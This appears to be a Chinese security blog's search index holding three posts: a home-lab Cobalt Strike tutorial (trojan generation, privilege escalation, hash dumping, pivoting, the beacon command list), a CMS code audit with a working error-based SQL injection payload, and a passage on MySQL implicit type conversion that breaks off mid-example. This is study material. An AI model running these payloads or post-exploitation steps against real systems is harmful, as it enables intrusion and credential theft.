<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>初探cobaltstrike(一)</title>
      <link href="/2019/09/04/cobalt-strike-1/"/>
      <url>/2019/09/04/cobalt-strike-1/</url>
      
        <content type="html"><![CDATA[<p>趁着有时间，把不懂的学一学(๑•̀ㅂ•́)و✧.</p><a id="more"></a><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><h4 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h4><p>先启动一个服务端</p><p><code>./teamserver ip password</code></p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904161823.png" alt></p><p>启动客户端连接</p><p><code>./cobaltstrike</code> </p><p><code>User</code>随便输，<code>Password</code>是启动服务端时的密码。</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135002.png" alt></p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135015.png" alt></p><h4 id="模块介绍"><a href="#模块介绍" class="headerlink" title="模块介绍"></a>模块介绍</h4><h5 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">New Connection  创建一个新连接</span><br><span class="line">Perferences  修改一些字体信息啥的，也可以在TeamServers处删除登录凭证</span><br><span class="line">Visualization 显示的模式</span><br><span class="line">VPN interfaces vpn配置（未测试）</span><br><span class="line">Listensers  监听器，可以执行添加/编辑/移除监听等操作</span><br><span class="line">Script Manager 字面意思 脚本管理 脚本也是cs的一大杀器。</span><br></pre></td></tr></table></figure><h5 id="View"><a href="#View" class="headerlink" title="View"></a>View</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Applications 用于显示 System Profiler 获取的目标浏览器，操作系统，flash版本</span><br><span class="line">Credentials 显示所有已经获取的用户主机hash</span><br><span class="line">Downloads 显示下载的文件</span><br><span class="line">Event log 事件日志 记录团队  目标上线等记录</span><br><span class="line">Keystrokes 目标键盘记录</span><br><span class="line">Proxy Pivots 代理信息</span><br><span class="line">Screenshots 屏幕截图</span><br><span class="line">Script Console 加载自定义脚本</span><br><span class="line">Targets 显示所有主机</span><br><span class="line">Web log web服务日志</span><br></pre></td></tr></table></figure><h5 id="Attacks"><a href="#Attacks" class="headerlink" title="Attacks"></a>Attacks</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Packages</span><br><span class="line">HTML Application 生成hta文件</span><br><span class="line">MS Office Macro  宏office文件</span><br><span class="line">Payload Generator  生成各种语言版本的payload</span><br><span class="line">USB/CD AutoPlay 利用自动播放运行的被控端文件</span><br><span class="line">Windows Dropper 捆绑器可将任意正常的文件</span><br><span class="line">Windows Executable payload生成可执行文件</span><br><span class="line">Windows Executable (S)  无状态</span><br><span class="line">------------------------------------------</span><br><span class="line">Web Drive-by </span><br><span class="line">Manage  开启的所有web服务</span><br><span class="line">Clone Site 克隆网站 </span><br><span class="line">Host File 提供Web以供下载某文件</span><br><span class="line">Scripted Web Delivery  为payload提供web服务以便于下载和执行</span><br><span class="line">Signed Applet Attack  启动一个Web服务以提供自签名Java Applet的运行环境</span><br><span class="line">Smart Applet Attack  自动检测Java版本并l利用已知的exploits绕过security</span><br><span class="line">System Profiler 获取系统，Flash，浏览器版本等</span><br><span class="line">-------------------------------------------</span><br><span class="line">Spear Phish 鱼叉式网络钓鱼</span><br></pre></td></tr></table></figure><h4 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h4><p>首先，我们设置一个监听，<code>Cobalt Strike-&gt;Listensers-&gt;Add</code> ，cs提供了八种方式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">windows/beacon_dns/reverse_dns_txt</span><br><span class="line">windows/beacon_dns/reverse_http</span><br><span class="line">windows/beacon_http/reverse_http</span><br><span class="line">windows/beacon_https/reverse_https</span><br><span class="line">windows/beacon_smb/bind_pipe 即 SMB Beacon</span><br><span class="line">windows/foreign/reverse_http</span><br><span class="line">windows/foreign/reverse_https</span><br><span class="line">windows/foreign/reverse_tcp</span><br></pre></td></tr></table></figure><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135032.png" alt></p><p>开启以后，为了测试方便，我们直接生成一个马，传到靶机上。</p><p><code>Attacks-&gt;Windows Executable</code> 生成一个64位木马，然后绑定到一开始创建的监听<code>test1</code>上。</p><p>靶机运行<code>exe</code>以后cs接收到一个<code>Beacon</code>(信标标志之类的意思)。类似于<code>msf</code>的<code>meterpreter</code>。</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135051.png" alt></p><p>右键<code>Interact</code>,与<code>beacon</code>交互。输入<code>help</code>查阅能够执行的命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; help</span><br><span class="line"></span><br><span class="line">Beacon Commands</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">    Command                   Description</span><br><span class="line">    -------                   -----------</span><br><span class="line">    browserpivot              Setup a browser pivot session</span><br><span class="line">    bypassuac                 Spawn a session in a high integrity process</span><br><span class="line">    cancel                    Cancel a download that&apos;s in-progress</span><br><span class="line">    cd                        Change directory</span><br><span class="line">    checkin                   Call home and post data</span><br><span class="line">    clear                     Clear beacon queue</span><br><span class="line">    covertvpn                 Deploy Covert VPN client</span><br><span class="line">    cp                        Copy a file</span><br><span class="line">    dcsync                    Extract a password hash from a DC</span><br><span class="line">    desktop                   View and interact with target&apos;s desktop</span><br><span class="line">    dllinject                 Inject a Reflective DLL into a process</span><br><span class="line">    dllload                   Load DLL into a process with LoadLibrary()</span><br><span class="line">    download                  Download a file</span><br><span class="line">    downloads                 Lists file downloads in progress</span><br><span class="line">    drives                    List drives on target</span><br><span class="line">    elevate                   Try to elevate privileges</span><br><span class="line">    execute                   Execute a program on target (no output)</span><br><span class="line">    execute-assembly          Execute a local .NET program in-memory on target</span><br><span class="line">    exit                      Terminate the beacon session</span><br><span class="line">    getprivs                  Enable system privileges on current token</span><br><span class="line">    getsystem                 Attempt to get SYSTEM</span><br><span class="line">    getuid                    Get User ID</span><br><span class="line">    hashdump                  Dump password hashes</span><br><span class="line">    help                      Help menu</span><br><span class="line">    inject                    Spawn a session in a specific process</span><br><span class="line">    jobkill                   Kill a long-running post-exploitation task</span><br><span class="line">    jobs                      List long-running post-exploitation tasks</span><br><span class="line">    kerberos_ccache_use       Apply kerberos ticket from cache to this session</span><br><span class="line">    kerberos_ticket_purge     Purge kerberos tickets from this session</span><br><span class="line">    kerberos_ticket_use       Apply kerberos ticket to this session</span><br><span class="line">    keylogger                 Inject a keystroke logger into a process</span><br><span class="line">    kill                      Kill a process</span><br><span class="line">    link                      Connect to a Beacon peer over SMB</span><br><span class="line">    logonpasswords            Dump credentials and hashes with mimikatz</span><br><span class="line">    ls                        List files</span><br><span class="line">    make_token                Create a token to pass credentials</span><br><span class="line">    mimikatz                  Runs a mimikatz command</span><br><span class="line">    mkdir                     Make a directory</span><br><span class="line">    mode dns                  Use DNS A as data channel (DNS beacon only)</span><br><span class="line">    mode dns-txt              Use DNS TXT as data channel (DNS beacon only)</span><br><span class="line">    mode dns6                 Use DNS AAAA as data channel (DNS beacon only)</span><br><span class="line">    mode http                 Use HTTP as data channel</span><br><span class="line">    mode smb                  Use SMB peer-to-peer communication</span><br><span class="line">    mv                        Move a file</span><br><span class="line">    net                       Network and host enumeration tool</span><br><span class="line">    note                      Assign a note to this Beacon       </span><br><span class="line">    portscan                  Scan a network for open services</span><br><span class="line">    powerpick                 Execute a command via Unmanaged PowerShell</span><br><span class="line">    powershell                Execute a command via powershell.exe</span><br><span class="line">    powershell-import         Import a powershell script</span><br><span class="line">    ppid                      Set parent PID for spawned post-ex jobs</span><br><span class="line">    ps                        Show process list</span><br><span class="line">    psexec                    Use a service to spawn a session on a host</span><br><span class="line">    psexec_psh                Use PowerShell to spawn a session on a host</span><br><span class="line">    psinject                  Execute PowerShell command in specific process</span><br><span class="line">    pth                       Pass-the-hash using Mimikatz</span><br><span class="line">    pwd                       Print current directory</span><br><span class="line">    reg                       Query the registry</span><br><span class="line">    rev2self                  Revert to original token</span><br><span class="line">    rm                        Remove a file or folder</span><br><span class="line">    rportfwd                  Setup a reverse port forward</span><br><span class="line">    run                       Execute a program on target (returns output)</span><br><span class="line">    runas                     Execute a program as another user</span><br><span class="line">    runasadmin                Execute a program in a high-integrity context</span><br><span class="line">    runu                      Execute a program under another PID</span><br><span class="line">    screenshot                Take a screenshot</span><br><span class="line">    setenv                    Set an environment variable</span><br><span class="line">    shell                     Execute a command via cmd.exe</span><br><span class="line">    shinject                  Inject shellcode into a process</span><br><span class="line">    shspawn                   Spawn process and inject shellcode into it</span><br><span class="line">    sleep                     Set beacon sleep time</span><br><span class="line">    socks                     Start SOCKS4a server to relay traffic</span><br><span class="line">    socks stop                Stop SOCKS4a server</span><br><span class="line">    spawn                     Spawn a session </span><br><span class="line">    spawnas                   Spawn a session as another user</span><br><span class="line">    spawnto                   Set executable to spawn processes into</span><br><span class="line">    spawnu                    Spawn a session under another PID</span><br><span class="line">    ssh                       Use SSH to spawn an SSH session on a host</span><br><span class="line">    ssh-key                   Use SSH to spawn an SSH session on a host</span><br><span class="line">    steal_token               Steal access token from a process</span><br><span class="line">    timestomp                 Apply timestamps from one file to another</span><br><span class="line">    unlink                    Disconnect from parent Beacon</span><br><span class="line">    upload                    Upload a file</span><br><span class="line">    wdigest                   Dump plaintext credentials with mimikatz</span><br><span class="line">    winrm                     Use WinRM to spawn a session on a host</span><br><span class="line">    wmi                       Use WMI to spawn a session on a host</span><br></pre></td></tr></table></figure><h3 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h3><h4 id="内网环境"><a href="#内网环境" class="headerlink" title="内网环境"></a>内网环境</h4><h5 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h5><p>为了测试方便，本地使用<code>VMware Station</code>模拟两层内网，机器配置有限，就开了三个虚拟机，一台<code>xp</code>，一台<code>win7</code>，一台<code>Ubuntu14.04</code>,一层内网有<code>Ubuntu</code>和<code>win7</code>，内网机器有一台<code>xp</code>，其中<code>win7</code>位跳板机，可以访问内网。</p><p>在<code>Vmware</code>中可以通过添加网卡，然后将该网卡设置为LAN网段模式，然后在机器中固定<code>ip</code>。</p><h5 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h5><p>现在我们假设通过一些手段拿到了<code>win7</code>的权限，可以执行命令，上传文件，我们可以通过cs生成一个木马上传到win7上，然后服务端创建一个<code>Listener</code>，就可以得到一个<code>Beacon</code>。</p><p><code>Attacks-&gt;Windows Executable</code> 然后绑定<code>Lsitener</code>，在靶机上执行该文件，等待主机上线。</p><p>可以看到我们已经得到一个<code>Beacon</code>，默认的sleep时间为60s，我们本地测试就直接sleep 0，节约时间。</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135107.png" alt></p><p>内外网<code>ip</code> 主机名 连接时间等都显示的很清楚。</p><p>看一下主机<code>ip</code>，是否存在内网或者是域，判断一下网络拓扑。<code>shell ipconfig</code></p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135119.png" alt></p><p>有两个网卡，初步判断存在内网.</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135134.png" alt></p><p>靶机上线后有三种视图，第一种在复杂的情况下直观的展示网络拓扑是怎样的，第二种比较简洁，列表的形式展示，第三种站在目标的角度，表明我们可以进行怎样的操作。第一种最炫(zhuang)酷(bi)！</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135145.png" alt></p><p>靶机处右键<code>Interact</code>,得到一个交互式的<code>Beacon</code>，输入<code>help</code>查看帮助。常规操作，查看权限，权限不够提权，抓hash</p><p>右键<code>Access-&gt;DumpHash</code> 尝试导出hash，提示权限不够，尝试提权.</p><p>cs内置了几种提权方式，针对一些版本低的主机(win7)，可以通过添加自定义脚本来增强cs的功能。</p><p><code>gayhub</code>上有个项目，收集了很多的自定义脚本：<a href="https://github.com/harleyQu1nn/AggressorScripts" target="_blank" rel="noopener">https://github.com/harleyQu1nn/AggressorScripts</a></p><p>导入几个试一下，导入了<code>AV_Query</code> <code>elevate</code> <code>EDR</code>三个脚本，其中<code>elevate</code>新提供了五种提权的方式。</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135227.png" alt></p><p>使用<code>AV_Query</code> 看一下安装了啥防护软件,因为是虚拟机，我啥也没装，只有自带的<code>windows defender</code></p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135239.png" alt></p><p>使用<code>ms14-058</code>提升权限，在交互式<code>Beacon</code>中可以看到进度：</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135250.png" alt></p><p> 完成后得到<code>system</code>权限的<code>Beacon</code>.</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135303.png" alt></p><p>导出<code>Hash</code>,导出完成后点击图标栏中的名片图标，很直观的看到提取出的用户凭证。</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135328.png" alt></p><p>如果内置的payload提权不成功，可以试一下进程注入的手法.</p><p>右键-&gt;<code>access</code>-&gt;<code>explore</code>-&gt;<code>process list</code>-&gt;<code>inject (选择一个高权限且稳定的进程)</code></p><p>继续横向渗透,看一下同网段中有没有其他主机。</p><p>可以使用<code>msf</code>与cs联动，使用<code>Spawn</code>将<code>Beacon</code>派生到<code>msf</code>。</p><p>首先在cs中创建一个<code>forgin</code>的<code>Listener</code>，同时在<code>msf</code>中使用<code>handler</code>监听相同端口</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135339.png" alt></p><p>靶机右键<code>Spawn</code>,<code>msf</code>中得到一个<code>meterpreter</code></p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135353.png" alt></p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135404.png" alt></p><p>然后使用<code>nmap</code>或者是其他模块扫描</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135415.png" alt></p><p>也可以使用cs自带的<code>portscan</code>  <code>explore-&gt;portscan</code> ，扫描完成后可以看到内网中存在的主机列表。</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135457.png" alt></p><p>发现还存活一台<code>ubuntu</code> 主机，此处假装通过爆破得到密码账号(滑稽），<code>Login-&gt;ssh</code>登录。</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135604.png" alt></p><p>查看权限，不是root权限，尝试提权，<code>upload</code>上传<code>linux-suggester-2.pl</code>，看一下内核漏洞，记得上传后要给执行权限。</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135616.png" alt></p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135626.png" alt></p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135637.png" alt></p><p>直接使用脏牛提权。</p><p>上边提到还有一层处在内网的主机，可以通过cs提供的<code>Sock</code>代理带入。</p><p><code>右键-&gt;Pivoting-&gt;SOCKS server</code></p><p>可以在<code>View-&gt;Proxy Pivots</code>中看到正在运行的代理。</p><p><code>kali</code>自带<code>proxychains</code>,修改配置为<code>socks4 127.0.0.1 port</code> ，将三方工具带入。（小声bb，我本地测试的时候发现不行…可能是我操作问题）</p><p>在<code>msf</code>中还可以直接输入<code>setg Proxies socks4:team server IP:proxy port</code> 将其带入内网。</p><p>输入<code>setg ReverseAllowProxy true</code> 保证收到回连的数据。</p><p>内网<code>xp</code>直接上<code>ms08-067</code>，得到<code>meterpreter</code>通过<code>payload_inject</code>模块转给cs。</p><p>详细的操作可以看<a href="[https://github.com/aleenzz/Cobalt_Strike_wiki/blob/master/%E7%AC%AC%E5%8D%81%E5%85%AD%E8%8A%82%5BMSF%E4%B8%8ECS%E4%BC%9A%E8%AF%9D%E4%BA%92%E8%BD%AC%5D.md](https://github.com/aleenzz/Cobalt_Strike_wiki/blob/master/第十六节[MSF与CS会话互转].md)">[https://github.com/aleenzz/Cobalt_Strike_wiki/blob/master/%E7%AC%AC%E5%8D%81%E5%85%AD%E8%8A%82%5BMSF%E4%B8%8ECS%E4%BC%9A%E8%AF%9D%E4%BA%92%E8%BD%AC%5D.md]</a></p><p>==! 自己测试的时候出了一些问题，暂时没解决，先放一边…</p><p>假设我们已经完成上述步骤… ，再看下这时候的拓扑</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135653.png" alt></p><h5 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h5><p>内网xp无法访问，自带的代理与其他的<code>socks</code>代理工具都试过了，无法带入内网，后来发现是环境问题，个人机器没有抓发功能，导致数据过不去==！也尝试了仅主机模式，木得行o(一︿一+)o…., 先挖个坑吧，以后来填坑~</p><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>上述介绍的都是cs的一些基本语法以及使用手段，后续可能会更新cs一些进阶用法，文章有不足或者任何错误，请各位大佬不吝赐教。感谢大佬们对cs的各种总结。╰(<em>°▽°</em>)╯</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://rcoil.me/2018/04/Cobalt%20Strike学习" target="_blank" rel="noopener">https://rcoil.me/2018/04/Cobalt%20Strike学习</a></p><p><a href="https://mp.weixin.qq.com/s/CEI1XYkq2PZmYsP0DRU7jg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/CEI1XYkq2PZmYsP0DRU7jg</a></p><p><a href="https://blog.51cto.com/life2death/1618744" target="_blank" rel="noopener">https://blog.51cto.com/life2death/1618744</a></p><p><a href="https://mp.weixin.qq.com/s/tqOv6p9NhKpo6Isz5jBuKw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/tqOv6p9NhKpo6Isz5jBuKw</a></p><p><a href="https://xz.aliyun.com/t/4191" target="_blank" rel="noopener">https://xz.aliyun.com/t/4191</a></p><p><a href="https://wbglil.gitbooks.io/cobalt-strike/" target="_blank" rel="noopener">https://wbglil.gitbooks.io/cobalt-strike/</a></p><p><a href="https://github.com/aleenzz/Cobalt_Strike_wiki" target="_blank" rel="noopener">https://github.com/aleenzz/Cobalt_Strike_wiki</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cobalt_strike </tag>
            
            <tag> tools </tag>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>某CMS代码审计</title>
      <link href="/2019/09/01/audit-1/"/>
      <url>/2019/09/01/audit-1/</url>
      
        <content type="html"><![CDATA[<p>九月第一天，加油哇( •̀_•́ )</p><p>记录一下代码审计的过程。</p><a id="more"></a><h5 id="1-系统重装漏洞"><a href="#1-系统重装漏洞" class="headerlink" title="1.系统重装漏洞"></a>1.系统重装漏洞</h5><h6 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h6><p> 安装完成后未删除<code>install.php</code>文件。</p><h6 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h6><p>定位到<code>install.php</code>，第6行位置</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190828092758.png" alt></p><p>判断了是否存在<code>install.lock</code>文件，然后没有下文了。。。可能是开发失误。</p><h6 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h6><p>安装完成</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190828093141.png" alt></p><p>然后访问<code>install.php</code> 可以重装</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190828093215.png" alt></p><h5 id="2-后台xss-滑稽"><a href="#2-后台xss-滑稽" class="headerlink" title="2.后台xss(滑稽)"></a>2.后台xss(滑稽)</h5><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190828101752.png" alt></p><h5 id="3-sql语句暴露"><a href="#3-sql语句暴露" class="headerlink" title="3.sql语句暴露"></a>3.sql语句暴露</h5><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190828153436.png" alt></p><h5 id="4-后台sql注入-鸡肋"><a href="#4-后台sql注入-鸡肋" class="headerlink" title="4.后台sql注入(鸡肋)"></a>4.后台sql注入(鸡肋)</h5><h6 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h6><p>访问<code>url:</code> <code>http://127.0.0.1/uqcms/index.php/admin/ad/save</code></p><p>post提交数据 <code>alias=1#&amp;id=1 and updatexml(1,concat(0x7e,(select/**/user()),0x7e),1)#&amp;name=2&amp;px=0</code></p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190828160305.png" alt></p><h6 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h6><p><code>admin/ad_class.php</code> 第62行</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190828161448.png" alt></p><p>通过P函数获取id的值，跟进P函数</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190828161531.png" alt></p><p>因为传入的是<code>false</code>,去掉空格后直接返回，没有任何过滤。</p><h5 id="5-前台sql注入"><a href="#5-前台sql注入" class="headerlink" title="5. 前台sql注入"></a>5. 前台sql注入</h5><h6 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h6><p>需要注册一个会员账号，</p><p>在修改收货地址处抓包，修改id参数，id参数未过滤，可报错注入，得到数据。</p><h6 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h6><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190829140746.png" alt></p><h6 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h6><p><code>home/address.class.php</code> 文件，第35行位置</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190829141016.png" alt></p><p>通过P函数获取后直接传入sql语句进行查询。</p><p>sql注入在这套cms里应该是不少…，以上只是举个例子，开发者把希望寄托在了<code>360_safe.php</code>提供的过滤规则上… ，虽然过滤大部分，但是没有过滤报错函数，POST方式没有过滤单引号。</p><h5 id="6-文件上传"><a href="#6-文件上传" class="headerlink" title="6. 文件上传"></a>6. 文件上传</h5><p>本地上传正常图片也不行，没进一步测试，附上先知社区大佬分析</p><p><a href="https://xz.aliyun.com/t/6075" target="_blank" rel="noopener">https://xz.aliyun.com/t/6075</a></p><h5 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h5><p>代码审计的能力太弱，希望自己能坚持下去，写成一个系列文章吧！</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> code </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql隐式类型转换及其安全问题</title>
      <link href="/2019/08/25/fasle-mysql-injection/"/>
      <url>/2019/08/25/fasle-mysql-injection/</url>
      
        <content type="html"><![CDATA[<p>测试时发现的一点小问题。</p><a id="more"></a><p>所谓的隐式类型转换，就是在不使用转换函数的情况下，默认转换了类型，比方说定义一个<code>varchar</code>变量<code>id</code>，传入了一个非预期类型的值，就会转换类型然后带入语句查询。说到底是忽略了不同数据类型之间是否兼容。</p><p>隐式类型转换有时会导致无法使用索引的风险，尤其是在高并发的情况下，不走索引就会全盘搜索，进行N多次I/O操作，占用很多资源而且浪费时间。</p><h4 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h4><p>看一下转换规则：</p><p><a href="https://dev.mysql.com/doc/refman/5.7/en/type-conversion.html" target="_blank" rel="noopener">mysql官方文档</a></p><p>翻译过来的规则如下(半机翻)：</p><ul><li>如果是一个或两个参数<code>NULL</code>，则比较的结果是<code>NULL</code>，除了<code>NULL</code>-safe <a href="https://dev.mysql.com/doc/refman/5.7/en/comparison-operators.html#operator_equal-to" target="_blank" rel="noopener"><code>&lt;=&gt;</code></a> 等式比较运算符。因为<code>NULL &lt;=&gt; NULL</code>，结果是真的。无需转换。</li><li>如果比较操作中的两个参数都是字符串，则将它们作为字符串进行比较。</li><li>如果两个参数都是整数，则将它们作为整数进行比较。</li><li>如果不与数字进行比较，十六进制值将被视为二进制字符串。</li><li>如果其中一个参数是<code>TIMESTAMP</code> 或<code>DATETIME</code>列而另一个参数是常量，则在执行比较之前将常量转换为时间戳。</li><li>有一个参数是 decimal 类型，如果另外一个参数是 decimal 或者整数，会将整数转换为 decimal 后进行比较，如果另外一个参数是浮点数，则会把 decimal 转换为浮点数进行比较.</li><li>所有其他情况下，两个参数都会被转换为浮点数再进行比较.</li></ul><h4 id="测试实例"><a href="#测试实例" class="headerlink" title="测试实例"></a>测试实例</h4><p><code>test_table</code>表中有<code>username</code>字段，<code>varchar</code>类型</p><p><fancybox><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190825151001.png" alt></fancybox></p><p>正常情况下：</p><fancybox><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190825151108.png" alt></p></fancybox><p></p><p>当我们输入0时，</p><p><fancybox><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190825151353.png" alt></fancybox></p><p>会返回全部的数据，这是为什么？</p><p>看上边的规则，最后一条，其他情况下，会转换成浮点数进行比较，字符串转浮点数会失败，就像php弱类型一样，mysql有没有类似的机制呢？尝试一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1=&apos;aaa&apos;,1=&apos;1aaa&apos;,1=&apos;2aaa&apos;,1=&apos;123aaa&apos;,1=1.0;</span><br><span class="line">+---------+----------+----------+------------+-------+</span><br><span class="line">| 1=&apos;aaa&apos; | 1=&apos;1aaa&apos; | 1=&apos;2aaa&apos; | 1=&apos;123aaa&apos; | 1=1.0 |</span><br><span class="line">+---------+----------+----------+------------+-------+</span><br><span class="line">|       0 |        1 |        0 |          0 |     1 |</span><br><span class="line">+---------+----------+----------+------------+-------+</span><br><span class="line">1 row in set, 4 warnings (0.00 